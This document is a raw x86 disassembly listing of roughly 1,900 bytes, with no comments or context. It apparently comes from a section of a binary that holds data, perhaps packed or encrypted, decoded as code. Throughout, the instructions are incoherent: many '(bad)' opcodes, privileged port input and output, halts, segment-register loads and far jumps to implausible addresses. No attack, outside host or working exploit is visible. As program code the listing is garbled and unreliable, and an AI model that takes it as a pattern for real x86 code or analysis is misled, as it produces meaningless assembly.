  41562f:	lods   eax,DWORD PTR ds:[esi]
  415630:	dec    edx
  415631:	mov    BYTE PTR [esi],dh
  415633:	fadd   st,st(4)
  415635:	enter  0x120b,0xee
  415639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41563a:	pop    es
  41563b:	icebp  
  41563c:	add    BYTE PTR [edx],al
  41563e:	int3   
  41563f:	in     al,dx
  415640:	push   ds
  415641:	and    BYTE PTR [ebp-0x172ba831],0x91
  415648:	or     edi,DWORD PTR [edi-0x12]
  41564b:	out    dx,al
  41564c:	add    ebp,edx
  41564e:	sar    BYTE PTR [edx],cl
  415650:	ret    
  415651:	dec    ebx
  415652:	inc    ebp
  415653:	cmp    esi,DWORD PTR [esi+0x4b]
  415656:	adc    eax,0x1051c857
  41565c:	out    0xb8,eax
  41565e:	loope  0x41560e
  415660:	pop    ss
  415661:	mov    dh,0x51
  415663:	(bad)  
  415664:	adc    ebp,DWORD PTR [esi+0x5ae010a8]
  41566a:	data16 cmp al,dh
  41566d:	rcr    bl,1
  41566f:	stos   DWORD PTR es:[edi],eax
  415670:	(bad)  
  415671:	sbb    esi,ebp
  415673:	sbb    eax,0x5d045bd1
  415678:	or     al,0x33
  41567a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41567b:	mov    ecx,es
  41567d:	into   
  41567e:	pop    ecx
  41567f:	nop
  415680:	push   ecx
  415681:	pop    edx
  415682:	xor    eax,0x3edb9e6
  415687:	dec    ecx
  415688:	mov    cl,0xf2
  41568a:	sbb    eax,0x6c8e5969
  41568f:	xchg   ebp,eax
  415690:	sub    al,0x45
  415692:	js     0x415670
  415694:	xor    DWORD PTR [ecx-0x49],eax
  415697:	and    ch,BYTE PTR [edx-0xf34a72b]
  41569d:	mov    ds:0x13a8fb37,eax
  4156a2:	mov    esi,0x88b6a5ae
  4156a7:	stos   DWORD PTR es:[edi],eax
  4156a8:	mov    esp,0x61f88662
  4156ad:	out    0x2,al
  4156af:	mov    cl,0x5b
  4156b1:	loopne 0x415731
  4156b3:	adc    BYTE PTR [edx+0x66],dl
  4156b6:	repnz adc eax,0x76c3a68a
  4156bc:	aaa    
  4156bd:	push   esi
  4156be:	push   ss
  4156bf:	push   eax
  4156c0:	jg     0x415648
  4156c2:	sub    eax,0x6a951892
  4156c7:	jecxz  0x415732
  4156c9:	mov    dl,0xe2
  4156cb:	fwait
  4156cc:	cmp    esi,DWORD PTR [ebx-0x52]
  4156cf:	int    0xb5
  4156d1:	push   esp
  4156d2:	loopne 0x415739
  4156d4:	aas    
  4156d5:	xor    al,0x46
  4156d7:	data16 (bad) 
  4156d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156da:	(bad)  
  4156db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156dc:	(bad)  
  4156dd:	icebp  
  4156de:	in     eax,dx
  4156df:	mov    ebx,0xbe4d8429
  4156e4:	(bad)  
  4156e5:	fimul  DWORD PTR [edx+0x39c00077]
  4156eb:	enter  0xc3d2,0x8b
  4156ef:	and    esp,DWORD PTR [eax+0x57]
  4156f2:	mov    cl,0xbf
  4156f4:	push   eax
  4156f5:	pop    eax
  4156f6:	mov    ds:0x748e7669,eax
  4156fb:	popf   
  4156fc:	stos   BYTE PTR es:[edi],al
  4156fd:	mov    ds:0xf1583b89,al
  415702:	scas   eax,DWORD PTR es:[edi]
  415703:	stos   DWORD PTR es:[edi],eax
  415704:	inc    esp
  415705:	ins    BYTE PTR es:[edi],dx
  415706:	aad    0xab
  415708:	mov    al,BYTE PTR [edi]
  41570a:	lds    ebx,FWORD PTR [ebx-0x1d4b4774]
  415710:	push   es
  415711:	ficom  WORD PTR [eax+edx*1]
  415714:	retf   
  415715:	ins    DWORD PTR es:[edi],dx
  415716:	(bad)  
  415717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415718:	dec    edi
  415719:	inc    ecx
  41571a:	out    dx,al
  41571b:	mov    ah,0xbc
  41571d:	lahf   
  41571e:	add    DWORD PTR [ecx-0x4fc85c9],ebp
  415724:	aaa    
  415725:	mov    al,0x1f
  415727:	bound  esi,QWORD PTR [ebx]
  415729:	int    0xd1
  41572b:	ins    BYTE PTR es:[edi],dx
  41572c:	repnz dec esp
  41572e:	pushf  
  41572f:	mov    edi,0x81c17e9b
  415734:	ret    0x826
  415737:	std    
  415738:	or     al,0x50
  41573a:	fistp  WORD PTR [ecx-0x13aaff60]
  415740:	add    edi,DWORD PTR [eax]
  415742:	mov    ds:0xc78a3806,eax
  415747:	jle    0x4157a1
  415749:	or     al,0xdf
  41574c:	pop    ss
  41574d:	out    dx,al
  41574e:	and    BYTE PTR [edx],dl
  415750:	cmp    DWORD PTR [edi-0x6],ecx
  415753:	iret   
  415754:	add    dh,bl
  415756:	test   eax,0x348a99ef
  41575b:	out    dx,al
  41575c:	int    0xb9
  41575e:	mov    edx,0x48018b71
  415763:	xor    DWORD PTR ds:0x97ca53d3,eax
  415769:	iret   
  41576a:	pop    ebx
  41576b:	dec    ebp
  41576c:	mov    bh,0x3e
  41576e:	enter  0x7b67,0x49
  415772:	test   eax,0xc78615dd
  415777:	scas   al,BYTE PTR es:[edi]
  415778:	arpl   WORD PTR [ecx],dx
  41577a:	pop    edi
  41577b:	ja     0x4157a7
  41577d:	adc    eax,0x7a95ffa2
  415782:	test   BYTE PTR [edx+0x3f4e2676],dl
  415788:	ret    0x3841
  41578b:	jb     0x41577f
  41578d:	stos   DWORD PTR es:[edi],eax
  41578e:	rep ins BYTE PTR es:[edi],dx
  415790:	sar    DWORD PTR [ebp-0x62],0x26
  415794:	or     dl,bh
  415796:	xor    eax,0x6d34dc86
  41579b:	cli    
  41579c:	xchg   esi,eax
  41579d:	or     DWORD PTR [edi],ebp
  41579f:	xor    DWORD PTR [eax+ecx*1],eax
  4157a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157a3:	add    cl,BYTE PTR [ecx]
  4157a5:	dec    edx
  4157a6:	lods   al,BYTE PTR ds:[esi]
  4157a7:	ins    BYTE PTR es:[edi],dx
  4157a8:	push   edi
  4157a9:	daa    
  4157aa:	je     0x4157f0
  4157ac:	add    eax,0xd1907580
  4157b1:	test   al,0xaf
  4157b3:	xchg   ebx,eax
  4157b4:	call   0xec6b8ba0
  4157b9:	push   ebp
  4157ba:	mov    ch,0x1c
  4157bc:	or     edx,DWORD PTR [esi-0x15]
  4157bf:	inc    ebp
  4157c0:	test   ecx,eax
  4157c2:	and    edi,0x1462c9e7
  4157c8:	mov    eax,0xc494957c
  4157cd:	sbb    al,0x38
  4157cf:	adc    al,0x3d
  4157d1:	mov    ds:0xbc5bb40f,al
  4157d6:	inc    esi
  4157d7:	shr    BYTE PTR [ecx-0x3777be9d],1
  4157dd:	mov    edx,0x8bcf0ba9
  4157e2:	sbb    BYTE PTR [ecx],bl
  4157e4:	xchg   esp,eax
  4157e5:	dec    al
  4157e7:	in     eax,0xb6
  4157e9:	mov    dh,BYTE PTR [eax+0x2340a7]
  4157ef:	or     al,0x9b
  4157f1:	push   esp
  4157f2:	dec    eax
  4157f3:	mov    al,0xc7
  4157f5:	sahf   
  4157f6:	add    al,0x49
  4157f8:	dec    ebp
  4157f9:	mov    al,ds:0x34d773e4
  4157fe:	pop    ebp
  4157ff:	rcl    DWORD PTR [esi],0x70
  415802:	scas   eax,DWORD PTR es:[edi]
  415803:	add    BYTE PTR [esi+0x16],bl
  415806:	dec    ebp
  415807:	lock sbb esi,edx
  41580a:	pusha  
  41580b:	sbb    eax,0x1ddd9f8c
  415810:	mov    bh,0xa6
  415812:	in     al,0x51
  415814:	hlt    
  415815:	jg     0x415855
  415817:	rcr    BYTE PTR [eax-0x1647f6fc],cl
  41581d:	xchg   ebx,eax
  41581e:	(bad)
  415821:	xor    edi,DWORD PTR [edi]
  415823:	cmp    BYTE PTR [ecx+0x28b8ff34],bh
  415829:	icebp  
  41582a:	adc    eax,0x2d276202
  41582f:	sbb    ebx,edx
  415831:	fwait
  415832:	mov    dl,0x64
  415834:	jno    0x41588c
  415836:	dec    esp
  415837:	nop
  415838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415839:	pop    es
  41583a:	cld    
  41583b:	cmp    cl,ah
  41583d:	xchg   edx,eax
  41583e:	in     al,0x31
  415840:	sbb    BYTE PTR [edx*8+0x10dd16fb],0x6c
  415848:	sbb    al,0x79
  41584a:	int    0xc4
  41584c:	sbb    eax,0x849ab5bd
  415851:	(bad)  
  415852:	dec    ebx
  415853:	fisttp QWORD PTR [edx+0x1b]
  415856:	scas   al,BYTE PTR es:[edi]
  415857:	or     al,0x3f
  415859:	push   ds
  41585a:	mov    ch,0xed
  41585c:	or     esp,esp
  41585e:	pop    ax
  415860:	jmp    FWORD PTR cs:[ebx+esi*4-0x67]
  415865:	outs   dx,DWORD PTR ds:[esi]
  415866:	(bad)  
  415867:	xor    edx,DWORD PTR [edi+eax*4+0x18bbb602]
  41586e:	fisttp QWORD PTR [ebp-0x41255849]
  415874:	shl    DWORD PTR [edx+0x45],0x72
  415878:	in     eax,dx
  415879:	mul    BYTE PTR [edi-0x43]
  41587c:	es push ebx
  41587e:	adc    dh,BYTE PTR [ebp+0x49b4070a]
  415884:	fmul   st,st(6)
  415886:	aas    
  415887:	lea    esi,[edi+ebp*8-0x6d]
  41588b:	pushf  
  41588c:	cmp    ch,BYTE PTR [esi-0x6f917d36]
  415892:	fwait
  415893:	lods   eax,DWORD PTR ds:[esi]
  415894:	mov    al,BYTE PTR [esi-0x1c6778ed]
  41589a:	cmp    al,ch
  41589c:	retf   
  41589d:	sub    BYTE PTR fs:[edx+0x66],ch
  4158a1:	retf   0xe8b3
  4158a4:	or     ecx,DWORD PTR [esp+ebx*2]
  4158a7:	jns    0x415863
  4158a9:	jae    0x415883
  4158ab:	loope  0x4158f8
  4158ad:	mov    cs,WORD PTR [esi-0x53]
  4158b0:	stc    
  4158b1:	cmp    DWORD PTR [eax],eax
  4158b3:	lahf   
  4158b4:	mov    ah,0xe6
  4158b6:	(bad)
  4158ba:	mov    ecx,DWORD PTR [edi+0x7c]
  4158bd:	mov    ah,0x3b
  4158bf:	xchg   ecx,eax
  4158c0:	jmp    0x41591e
  4158c2:	sbb    al,0x3a
  4158c4:	mov    edi,0x114e556f
  4158c9:	pop    es
  4158ca:	or     cl,BYTE PTR [ebx+0x3d]
  4158cd:	mov    al,0xfa
  4158cf:	(bad)  
  4158d0:	and    al,0x8d
  4158d2:	push   esi
  4158d3:	lahf   
  4158d4:	mov    edi,0x1fb29bc4
  4158d9:	scas   eax,DWORD PTR es:[edi]
  4158da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158db:	retf   0x1f9
  4158de:	arpl   WORD PTR [ebp+eiz*2-0x72],bx
  4158e2:	jl     0x4158f5
  4158e4:	sti    
  4158e5:	aas    
  4158e6:	movzx  edx,bp
  4158e9:	sub    al,0x74
  4158eb:	and    dh,BYTE PTR [ebp-0x14]
  4158ee:	xor    cl,al
  4158f0:	mov    dh,0x70
  4158f2:	and    edx,DWORD PTR [ebp+0x8]
  4158f5:	ins    BYTE PTR es:[edi],dx
  4158f6:	mov    dh,0x99
  4158f8:	les    eax,FWORD PTR [eax-0x1aaf73ff]
  4158fe:	xchg   esp,eax
  4158ff:	mov    ds:0x8c6329ea,al
  415904:	dec    ecx
  415905:	sti    
  415906:	and    eax,0x8acfa6fc
  41590b:	jbe    0x415959
  41590d:	jge    0x415958
  41590f:	pusha  
  415910:	sbb    edi,eax
  415912:	jp     0x4158b3
  415914:	mov    cl,0x4c
  415916:	jo     0x415907
  415918:	and    ecx,esp
  41591a:	sub    eax,0xa5112393
  41591f:	fild   QWORD PTR [ecx]
  415921:	add    bh,BYTE PTR [edx]
  415923:	mov    al,0x82
  415925:	out    0x1f,eax
  415927:	pop    esi
  415928:	hlt    
  415929:	shr    DWORD PTR [edx],1
  41592b:	test   eax,0x67143641
  415930:	pop    edx
  415931:	xor    cl,ch
  415933:	inc    eax
  415934:	and    dh,cl
  415936:	push   esp
  415937:	scas   al,BYTE PTR es:[edi]
  415938:	jnp    0x415907
  41593a:	mov    esp,0xcef61ddd
  41593f:	(bad)  
  415940:	mov    dh,0x39
  415942:	xchg   ecx,eax
  415943:	xor    DWORD PTR [eax],ebx
  415945:	jae    0x415971
  415947:	fmul   st(7),st
  415949:	dec    eax
  41594a:	xchg   edi,eax
  41594b:	aaa    
  41594c:	loope  0x415988
  41594e:	mov    es,WORD PTR fs:[edx-0x6]
  415952:	mov    ds,edi
  415954:	add    ebp,DWORD PTR [edx+0x12]
  415957:	call   0xcaedc968
  41595c:	dec    ebx
  41595d:	xor    al,0x1
  41595f:	ret    
  415960:	xchg   ecx,eax
  415961:	and    dl,dh
  415963:	cmp    al,0x61
  415965:	inc    edx
  415966:	ror    BYTE PTR [edx+edx*8],0x2f
  41596a:	xchg   ebp,eax
  41596b:	ja     0x4159cb
  41596d:	aad    0xaf
  41596f:	pop    es
  415970:	push   0x66
  415972:	push   esi
  415973:	jecxz  0x415979
  415975:	mov    dl,0x25
  415977:	ss jmp 0x415999
  41597a:	mov    ?,WORD PTR [edx+esi*1]
  41597d:	and    eax,0x9c654871
  415982:	jnp    0x4159d0
  415984:	adc    BYTE PTR [ecx+0x11],0x36
  415988:	inc    ecx
  415989:	cmp    eax,0x400151ce
  41598e:	fprem1 
  415990:	(bad)  
  415991:	aas    
  415992:	jecxz  0x4159cc
  415994:	sub    esp,DWORD PTR [ebp+0x41b29d3a]
  41599a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41599b:	inc    ebx
  41599c:	mov    ebx,0x82bc3137
  4159a1:	adc    ebx,ebp
  4159a3:	push   esp
  4159a4:	fsub   DWORD PTR [edi-0x45]
  4159a7:	mov    ss,esi
  4159a9:	or     dl,BYTE PTR [esi-0x2d13a279]
  4159af:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4159b1:	cmp    eax,0x72677b70
  4159b6:	inc    esi
  4159b7:	or     DWORD PTR ss:[edx+eiz*8+0x7],ebp
  4159bc:	ja     0x415a3b
  4159be:	push   esp
  4159bf:	cmp    ch,ah
  4159c1:	stos   DWORD PTR es:[edi],eax
  4159c2:	pop    ecx
  4159c3:	xchg   ebp,eax
  4159c4:	xor    bh,BYTE PTR es:[ebp-0x2b]
  4159c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159c9:	pop    ecx
  4159ca:	mov    ah,0x8d
  4159cc:	mov    ch,BYTE PTR [eax+esi*1+0x20]
  4159d0:	scas   eax,DWORD PTR es:[edi]
  4159d1:	fld    st(2)
  4159d3:	int    0x9c
  4159d5:	(bad)  
  4159d6:	iret   
  4159d7:	add    DWORD PTR [eax-0x3b],esp
  4159da:	adc    DWORD PTR [edi],ebp
  4159dc:	cmc    
  4159dd:	addr16 fld1 
  4159e0:	or     DWORD PTR [esi+0x67],0x2c
  4159e4:	(bad)  
  4159e5:	fidiv  WORD PTR [edi+0x1d07d0aa]
  4159eb:	(bad)  
  4159ec:	and    ebp,DWORD PTR [ebx+0x7c864575]
  4159f2:	adc    BYTE PTR [ebx],cl
  4159f4:	inc    ecx
  4159f5:	arpl   WORD PTR [esi-0x4f5211bf],si
  4159fb:	data16 mov bl,0x30
  4159fe:	sub    al,dh
  415a00:	ss es push edi
  415a03:	mov    BYTE PTR ds:0x23898f61,al
  415a09:	pmulhw mm7,QWORD PTR [ecx-0x54786543]
  415a10:	jle    0x4159a5
  415a12:	push   0x29
  415a14:	(bad)  
  415a15:	jne    0x415a51
  415a17:	push   eax
  415a18:	aam    0x74
  415a1a:	aam    0x15
  415a1c:	push   0xb9073183
  415a21:	std    
  415a22:	jmp    0xbe2:0x64fed3f5
  415a29:	mov    DWORD PTR [ebx-0x308a2658],0x8633e7d6
  415a33:	xchg   BYTE PTR [ebp+0x6f0055ab],dl
  415a39:	leave  
  415a3a:	mov    bh,0x34
  415a3c:	and    esi,edi
  415a3e:	mov    edi,0x1b2383e9
  415a43:	test   ch,cl
  415a45:	outs   dx,BYTE PTR ds:[esi]
  415a46:	test   BYTE PTR [edi-0x29182a94],bh
  415a4c:	pop    ecx
  415a4d:	shr    BYTE PTR [ebp-0x6d],1
  415a50:	bound  esp,QWORD PTR [ecx+0x23]
  415a53:	(bad)  
  415a54:	mov    ebx,0x30cf3112
  415a59:	cmp    eax,0xb65676b7
  415a5e:	jo     0x415a60
  415a60:	xlat   BYTE PTR ds:[ebx]
  415a61:	dec    ebp
  415a62:	(bad)  
  415a63:	dec    edi
  415a64:	dec    esp
  415a65:	ins    BYTE PTR es:[edi],dx
  415a66:	jno    0x415a14
  415a68:	test   al,0x48
  415a6a:	push   0xe323521b
  415a6f:	aas    
  415a70:	daa    
  415a71:	bound  esp,QWORD PTR [ecx]
  415a73:	lods   eax,DWORD PTR ds:[esi]
  415a74:	pop    esi
  415a75:	sbb    eax,DWORD PTR [edx-0x1e068b46]
  415a7b:	inc    edi
  415a7c:	mov    BYTE PTR [ebx],ah
  415a7e:	into   
  415a7f:	push   ecx
  415a80:	inc    eax
  415a81:	cmp    ebp,DWORD PTR [eax+ebp*4-0x5d]
  415a85:	sub    al,0x36
  415a87:	push   edx
  415a88:	inc    edi
  415a89:	push   0x1da76152
  415a8e:	test   BYTE PTR [ebx+0x256b3a3e],bl
  415a94:	lea    ebp,[eax]
  415a96:	jne    0x415a88
  415a98:	pop    eax
  415a99:	sub    al,0xc1
  415a9b:	fwait
  415a9c:	cmp    DWORD PTR [eax],esp
  415a9e:	mov    DWORD PTR [eax-0x6ddf1778],ebp
  415aa4:	adc    DWORD PTR [esi+edx*1],edi
  415aa7:	test   BYTE PTR [ebx+ebx*4-0x37b71cd0],dh
  415aae:	xor    ah,BYTE PTR [edi+0x2cc82b32]
  415ab4:	mov    DWORD PTR [esi-0x46a5ebb8],0x7d2619a2
  415abe:	push   esi
  415abf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ac0:	and    eax,0xadc454f
  415ac5:	rol    DWORD PTR [ecx],1
  415ac7:	xor    DWORD PTR [edi+0x55],esp
  415aca:	xchg   ecx,eax
  415acb:	dec    ecx
  415acc:	sub    ecx,DWORD PTR [eax]
  415ace:	jb     0x415abc
  415ad0:	jge    0x415aaa
  415ad2:	jo     0x415a61
  415ad4:	mov    dh,0xd
  415ad6:	add    ebp,0x30ffc8e5
  415adc:	jge    0x415aa3
  415ade:	xchg   esp,eax
  415adf:	loope  0x415ad2
  415ae1:	add    ecx,edi
  415ae3:	jbe    0x415aa8
  415ae5:	pusha  
  415ae6:	dec    eax
  415ae7:	xchg   esp,eax
  415ae8:	imul   ebx,DWORD PTR [ebx-0x4cbda309],0xffffff8b
  415aef:	mov    eax,0xa76c61ed
  415af4:	fcom   DWORD PTR [esi]
  415af6:	dec    eax
  415af7:	cli    
  415af8:	sub    BYTE PTR [edx-0x3dfe9c6e],0x81
  415aff:	jl     0x415aa2
  415b01:	pop    esi
  415b02:	out    dx,al
  415b03:	cli    
  415b04:	or     eax,edi
  415b06:	xor    al,BYTE PTR [edx]
  415b08:	mov    esi,0x6014393c
  415b0d:	out    dx,eax
  415b0e:	jb     0x415b87
  415b10:	push   ds
  415b11:	mov    esi,eax
  415b13:	push   es
  415b14:	mov    ah,0x84
  415b16:	ss sub eax,0xe0c34638
  415b1d:	mov    ss,WORD PTR [ebp-0x17]
  415b20:	inc    ebx
  415b21:	xchg   esp,edx
  415b23:	movsx  ebp,ah
  415b26:	out    0x5d,eax
  415b28:	jno    0x415b7c
  415b2a:	(bad)  
  415b2b:	jns    0x415b12
  415b2d:	ror    DWORD PTR [ebp-0x5d9a3a40],1
  415b33:	popa   
  415b34:	in     al,0xcf
  415b36:	pop    es
  415b37:	pop    ecx
  415b38:	push   ecx
  415b39:	lahf   
  415b3a:	and    bl,BYTE PTR [esi-0x50]
  415b3d:	pop    ds
  415b3e:	ins    BYTE PTR es:[edi],dx
  415b3f:	mov    bl,0xf9
  415b41:	popa   
  415b42:	pop    ss
  415b43:	jge    0x415b3c
  415b45:	mov    ds:0xc80b2292,al
  415b4a:	(bad)
  415b4d:	mov    al,0xfa
  415b4f:	push   0x4
  415b51:	adc    ah,dh
  415b53:	add    al,0xbc
  415b55:	xchg   ebp,eax
  415b56:	pop    ds
  415b57:	(bad)  
  415b58:	jmp    0xc718:0x30cf7f1c
  415b5f:	test   BYTE PTR [ebp+0x33],dh
  415b62:	arpl   WORD PTR [ebx+0x6d],di
  415b65:	jno    0x415b03
  415b67:	push   0x751d2aec
  415b6c:	data16 jge 0x415bc7
  415b6f:	sbb    eax,0x91166ba5
  415b74:	in     al,0x8c
  415b76:	adc    BYTE PTR [edx],0x77
  415b79:	or     ch,BYTE PTR [ebx+0x39]
  415b7c:	mov    BYTE PTR [edi],0xe0
  415b7f:	outs   dx,DWORD PTR ds:[esi]
  415b80:	sbb    al,0x2c
  415b82:	std    
  415b83:	sub    DWORD PTR [esi+0x56],edi
  415b86:	loope  0x415b9c
  415b88:	adc    al,0x3
  415b8a:	dec    edx
  415b8b:	mov    edx,0x7e22d113
  415b90:	xchg   edx,eax
  415b91:	inc    ebp
  415b92:	js     0x415bb0
  415b94:	push   ebp
  415b95:	jg     0x415b2e
  415b97:	les    esi,FWORD PTR cs:[ebx+0x4d]
  415b9b:	hlt    
  415b9c:	lea    eax,[eax]
  415b9e:	xchg   ebx,eax
  415b9f:	dec    edx
  415ba0:	lahf   
  415ba1:	dec    ebx
  415ba2:	js     0x415b5b
  415ba4:	pop    edi
  415ba5:	push   edi
  415ba6:	(bad)  
  415ba7:	call   0x1678d42f
  415bac:	pop    edi
  415bad:	shr    DWORD PTR [edi-0x514ce6b8],0x7
  415bb4:	mov    ebx,0x35fb89ec
  415bb9:	out    dx,eax
  415bba:	xor    bl,bl
  415bbc:	xlat   BYTE PTR ds:[ebx]
  415bbd:	ds push es
  415bbf:	push   edi
  415bc0:	adc    BYTE PTR [ebx-0x1e4a0b59],dl
  415bc6:	jo     0x415b60
  415bc8:	jno    0x415baf
  415bca:	and    BYTE PTR [ecx-0x80],dl
  415bcd:	scas   al,BYTE PTR es:[edi]
  415bce:	aad    0xb4
  415bd0:	test   eax,0xed914dd6
  415bd5:	xor    al,0x4b
  415bd7:	stos   BYTE PTR es:[edi],al
  415bd8:	xchg   esi,eax
  415bd9:	fwait
  415bda:	(bad)  
  415bdb:	inc    edi
  415bdc:	and    BYTE PTR [edx],0x1a
  415bdf:	dec    ecx
  415be0:	push   cs
  415be1:	adc    al,0x30
  415be3:	jl     0x415b72
  415be5:	(bad)  
  415be6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415be7:	enter  0xde3,0x44
  415beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bec:	not    BYTE PTR [edx+ecx*8+0x3a]
  415bf0:	daa    
  415bf1:	ss sub esp,ebp
  415bf4:	out    0x54,al
  415bf6:	xchg   esi,eax
  415bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bf8:	leave  
  415bf9:	mov    dl,BYTE PTR es:[ebx-0x6983ddba]
  415c00:	xchg   ebx,eax
  415c01:	dec    ebx
  415c02:	jge    0x415b9b
  415c04:	cmp    al,0xd9
  415c07:	mov    eax,0xfad245a0
  415c0c:	adc    esi,0x4a
  415c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c10:	add    esi,DWORD PTR [ebx*2-0x1db49fab]
  415c17:	sbb    bh,BYTE PTR [edx+edx*8]
  415c1a:	fwait
  415c1b:	dec    ebx
  415c1c:	cmc    
  415c1d:	pop    ebx
  415c1e:	cmp    eax,0x52ca8ab1
  415c23:	jmp    0x415c3e
  415c25:	sbb    bl,dh
  415c27:	mov    ebx,0x9855300
  415c2c:	dec    eax
  415c2d:	fldcw  WORD PTR [eax-0x80a729d]
  415c33:	jge    0x415c9b
  415c35:	leave  
  415c36:	xor    al,0xb9
  415c38:	ds pop edx
  415c3a:	mov    ds:0xd7f6eaeb,eax
  415c3f:	jl     0x415be5
  415c41:	loop   0x415c20
  415c43:	js     0x415be0
  415c45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c46:	jbe    0x415bdc
  415c48:	(bad)  
  415c49:	sub    BYTE PTR [ebp-0x47],dh
  415c4c:	dec    edx
  415c4d:	hlt    
  415c4e:	sbb    DWORD PTR [ecx+0x5a067547],0xffffffc5
  415c55:	sbb    eax,0x773663fe
  415c5a:	jecxz  0x415cb1
  415c5c:	cmp    ch,BYTE PTR es:[ebx+ebx*2]
  415c60:	mov    eax,0x70d9c716
  415c65:	fist   WORD PTR [eax]
  415c67:	push   ds
  415c68:	push   ebp
  415c69:	inc    esp
  415c6a:	inc    ebp
  415c6b:	pop    eax
  415c6c:	call   DWORD PTR [ecx-0x3]
  415c6f:	inc    ebp
  415c70:	mov    ch,0xb7
  415c72:	jmp    0xab82:0x979c93c4
  415c79:	jmp    0x415bfc
  415c7b:	cli    
  415c7c:	and    al,0xfe
  415c7e:	ss data16 (bad) 
  415c81:	and    BYTE PTR [edi+0x5],bh
  415c84:	into   
  415c85:	pop    ebp
  415c86:	pop    ebp
  415c87:	xor    ah,bh
  415c89:	add    BYTE PTR cs:0xbc6cda60,al
  415c90:	add    DWORD PTR [edi+0x38],ebx
  415c93:	mov    al,0xca
  415c95:	(bad)  
  415c96:	aam    0x2b
  415c98:	outs   dx,DWORD PTR ds:[esi]
  415c99:	inc    esp
  415c9a:	mov    bh,BYTE PTR [eax]
  415c9c:	rol    BYTE PTR [eax],1
  415c9e:	cmp    ah,BYTE PTR [ebx+0x5]
  415ca1:	xchg   edi,eax
  415ca2:	or     cl,BYTE PTR [ebp+eax*8+0x6683f02a]
  415ca9:	(bad)  
  415caa:	int3   
  415cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cac:	test   al,0x40
  415cae:	mov    ds:0xebf8a732,eax
  415cb3:	mov    cl,0x2c
  415cb5:	clc    
  415cb6:	dec    esp
  415cb7:	ins    BYTE PTR es:[edi],dx
  415cb8:	mov    edi,0x6648b877
  415cbd:	push   eax
  415cbe:	pop    ss
  415cbf:	jl     0x415c9f
  415cc1:	mov    ecx,0x28acddbb
  415cc6:	inc    eax
  415cc7:	xlat   BYTE PTR ds:[ebx]
  415cc8:	push   cs
  415cc9:	loop   0x415cbe
  415ccb:	jo     0x415d3b
  415ccd:	pop    ds
  415cce:	jmp    0x7c79:0xc537337d
  415cd5:	jbe    0x415c5d
  415cd7:	pop    esp
  415cd8:	pop    ds
  415cd9:	mul    DWORD PTR [eax+0x1f6748a8]
  415cdf:	jmp    0x56896d38
  415ce4:	and    bh,dh
  415ce6:	out    0xc7,al
  415ce8:	pusha  
  415ce9:	or     eax,0x83a0a3e3
  415cee:	(bad)  
  415cef:	cmp    esi,ecx
  415cf1:	pop    ebx
  415cf2:	(bad)  
  415cf3:	jp     0x415d6c
  415cf5:	fcmovb st,st(4)
  415cf7:	push   esi
  415cf8:	sub    al,BYTE PTR [ecx]
  415cfa:	sub    DWORD PTR [esi+ecx*1],0x82edba44
  415d01:	and    BYTE PTR [eax-0x715612a0],bh
  415d07:	lds    ebx,FWORD PTR [ebx+0x1c3d1075]
  415d0d:	mov    edx,0xf2bb718c
  415d12:	popf   
  415d13:	daa    
  415d14:	sub    DWORD PTR [esi+0x8],edi
  415d17:	push   ss
  415d18:	stc    
  415d19:	repz and BYTE PTR [eax],bl
  415d1c:	test   bh,dl
  415d1e:	pop    ss
  415d1f:	psubb  mm1,QWORD PTR [esi]
  415d22:	and    esi,DWORD PTR [ebx-0x14]
  415d25:	(bad)  
  415d26:	leave  
  415d27:	outs   dx,DWORD PTR ds:[esi]
  415d28:	cmc    
  415d29:	ja     0x415d5c
  415d2b:	push   ecx
  415d2c:	xor    edx,DWORD PTR [si-0x12]
  415d30:	sub    dl,BYTE PTR [edi+0x7f]
  415d33:	std    
  415d34:	mov    al,ds:0x23c8142d
  415d39:	jle    0x415d25
  415d3b:	adc    ebx,DWORD PTR [ecx-0x72]
  415d3e:	(bad)  
  415d3f:	sar    bl,cl
  415d41:	lods   eax,DWORD PTR ds:[esi]
  415d42:	addr16 sbb eax,0xcd1ab5d1
  415d48:	xchg   ebp,eax
  415d49:	xchg   edx,eax
  415d4a:	aam    0x97
  415d4c:	lods   eax,DWORD PTR ds:[esi]
  415d4d:	jns    0x415cf4
  415d4f:	popa   
  415d50:	jnp    0x415d55
  415d52:	add    DWORD PTR [esi-0x10],ebp
  415d55:	mov    eax,0xa5b87631
  415d5a:	test   eax,0xe938d1ed
  415d5f:	arpl   WORD PTR [esi],dx
  415d61:	lahf   
  415d62:	dec    eax
  415d63:	sti    
  415d64:	mov    ds:0x647c1550,eax
  415d69:	sbb    DWORD PTR [edi+0xdfd2dd6],edi
  415d6f:	mov    esp,0xfce02f6f
  415d74:	mov    al,ds:0x5443fc6e
  415d79:	outs   dx,DWORD PTR ds:[esi]
  415d7a:	leave  
  415d7b:	cmp    BYTE PTR [ecx],dh
  415d7d:	mov    ds:0x8abe86e4,al
  415d82:	mov    ebx,ebx
  415d84:	mov    ds:0xa2cf2e80,al
  415d89:	xchg   dl,al
  415d8b:	fiadd  DWORD PTR [edx+0x244de151]
  415d91:	sti    
  415d92:	test   BYTE PTR [esi+0x1f],bh
  415d95:	and    dh,BYTE PTR [ecx+0x38895a78]
  415d9b:	xor    eax,0xa3682129
  415da0:	or     bh,al
  415da2:	mov    eax,ds:0x7e926bf8
  415da7:	dec    eax
  415da8:	outs   dx,DWORD PTR ds:[esi]
  415da9:	mov    al,ds:0xfc1ad472
